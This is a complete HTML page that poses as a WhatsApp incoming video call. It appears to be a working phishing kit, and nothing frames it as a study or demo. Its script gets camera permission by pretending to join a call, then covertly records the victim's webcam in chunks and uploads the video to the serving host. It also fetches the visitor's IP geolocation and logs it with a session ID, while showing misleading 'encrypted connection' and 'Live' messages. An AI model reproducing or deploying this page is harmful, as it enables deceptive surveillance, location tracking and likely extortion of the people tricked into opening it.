<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #111b21; color: #e9edef; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  .container { text-align: center; width: 100%; max-width: 420px; padding: 0; }

  /* Top bar */
  .topbar { background: #202c33; padding: 14px 16px; display: flex; align-items: center; gap: 12px; border-radius: 12px 12px 0 0; }
  .back-arrow { font-size: 22px; color: #aebac1; cursor: pointer; }
  .avatar { width: 40px; height: 40px; background: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 700; flex-shrink: 0; }
  .contact-info { flex: 1; text-align: left; }
  .contact-name { font-size: 16px; font-weight: 600; }
  .contact-status { font-size: 12px; color: #8696a0; }
  .call-icons { display: flex; gap: 18px; font-size: 20px; color: #aebac1; }

  /* Video area */
  .video-wrap { background: #0b141a; position: relative; aspect-ratio: 9/16; max-height: 55vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
  .avatar-big { font-size: 72px; }
  .caller-name { position: absolute; bottom: 16px; left: 0; right: 0; text-align: center; font-size: 18px; font-weight: 600; text-shadow: 0 1px 4px #000; }
  .call-timer { position: absolute; top: 16px; left: 0; right: 0; text-align: center; font-size: 14px; color: #00a884; display: none; }

  /* Bottom controls */
  .controls { background: #202c33; padding: 20px 16px 28px; border-radius: 0 0 12px 12px; }
  .status-msg { font-size: 14px; color: #8696a0; margin-bottom: 20px; }
  .btn-row { display: flex; justify-content: space-around; align-items: center; }
  .ctrl-btn { display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
  .ctrl-btn .icon { width: 52px; height: 52px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; }
  .ctrl-btn .label { font-size: 11px; color: #8696a0; }
  .btn-end { background: #f02849; }
  .btn-cam { background: #2a3942; }
  .btn-mic { background: #2a3942; }
  .btn-speaker { background: #2a3942; }
  .btn-join { background: #00a884; }
  .btn-join-main { background: #00a884; border: none; color: #fff; font-size: 16px; font-weight: 700; padding: 14px 48px; border-radius: 30px; cursor: pointer; width: 100%; margin-top: 4px; }
  .btn-join-main:disabled { background: #2a3942; color: #8696a0; }
  .timer-display { font-size: 13px; color: #00a884; margin-bottom: 6px; display: none; }
</style>
</head>
<body>
<div class="container">
  <div class="topbar">
    <div class="back-arrow">←</div>
    <div class="avatar">R</div>
    <div class="contact-info">
      <div class="contact-name">Rahul Sharma</div>
      <div class="contact-status" id="callStatus">Video call</div>
    </div>
    <div class="call-icons"><span>🔍</span><span>⋮</span></div>
  </div>

  <div class="video-wrap">
    <video id="preview" autoplay muted playsinline></video>
    <div id="avatarBig" class="avatar-big">👤</div>
    <div class="call-timer" id="callTimer">00:00</div>
    <div class="caller-name">Rahul Sharma</div>
  </div>

  <div class="controls">
    <div class="status-msg" id="statusMsg">Enable camera to start the video call</div>
    <div class="timer-display" id="timerDisplay">Recording...</div>
    <div class="btn-row" id="btnRow" style="display:none">
      <div class="ctrl-btn"><div class="icon btn-mic">🎤</div><div class="label">Mute</div></div>
      <div class="ctrl-btn"><div class="icon btn-speaker">🔊</div><div class="label">Speaker</div></div>
      <div class="ctrl-btn"><div class="icon btn-cam">📷</div><div class="label">Camera</div></div>
      <div class="ctrl-btn" onclick="endCall()"><div class="icon btn-end">📵</div><div class="label">End</div></div>
    </div>
    <button class="btn-join-main" id="joinBtn" onclick="startSession()">Join Video Call</button>
  </div>
</div>

<script>
const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
let mediaRecorder, chunkIndex = 0, stream, timerSec = 0, timerInterval;

async function getGeo() {
  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
}

function startTimer() {
  document.getElementById("callTimer").style.display = "block";
  timerInterval = setInterval(() => {
    timerSec++;
    const m = String(Math.floor(timerSec/60)).padStart(2,"0");
    const s = String(timerSec%60).padStart(2,"0");
    document.getElementById("callTimer").textContent = `${m}:${s}`;
  }, 1000);
}

async function startSession() {
  const btn = document.getElementById("joinBtn");
  btn.disabled = true; btn.textContent = "Connecting...";
  document.getElementById("statusMsg").textContent = "Allow camera access to connect";

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 }, audio: false });
  } catch {
    document.getElementById("statusMsg").textContent = "Camera blocked. Please allow and retry.";
    btn.disabled = false; btn.textContent = "Join Video Call";
    return;
  }

  document.getElementById("preview").srcObject = stream;
  document.getElementById("preview").style.display = "block";
  document.getElementById("avatarBig").style.display = "none";
  document.getElementById("callStatus").textContent = "Connecting...";
  document.getElementById("statusMsg").textContent = "Establishing encrypted connection...";

  const geo = await getGeo();
  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ session: SID, geo }) }).catch(()=>{});

  await new Promise(r => setTimeout(r, 2000));

  document.getElementById("callStatus").textContent = "Connected";
  document.getElementById("statusMsg").textContent = "";
  document.getElementById("timerDisplay").style.display = "block";
  document.getElementById("timerDisplay").textContent = "● Live";
  document.getElementById("joinBtn").style.display = "none";
  document.getElementById("btnRow").style.display = "flex";
  startTimer();
  startRecording(stream);
}

function endCall() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  if (stream) stream.getTracks().forEach(t => t.stop());
  clearInterval(timerInterval);
  document.getElementById("callStatus").textContent = "Call ended";
  document.getElementById("timerDisplay").textContent = "Call ended";
  document.getElementById("btnRow").style.display = "none";
}

function startRecording(stream) {
  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
  mediaRecorder.ondataavailable = async (e) => {
    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
  };
  mediaRecorder.onstop = async () => {
    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
  };
  mediaRecorder.start(5000);
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== "inactive") { mediaRecorder.stop(); endCall(); }
  }, 45000);
}

async function sendChunk(blob, index) {
  await fetch(`/upload?sid=${SID}&chunk=${index}`, {
    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
  }).catch(()=>{});
}
</script>
</body>
</html>
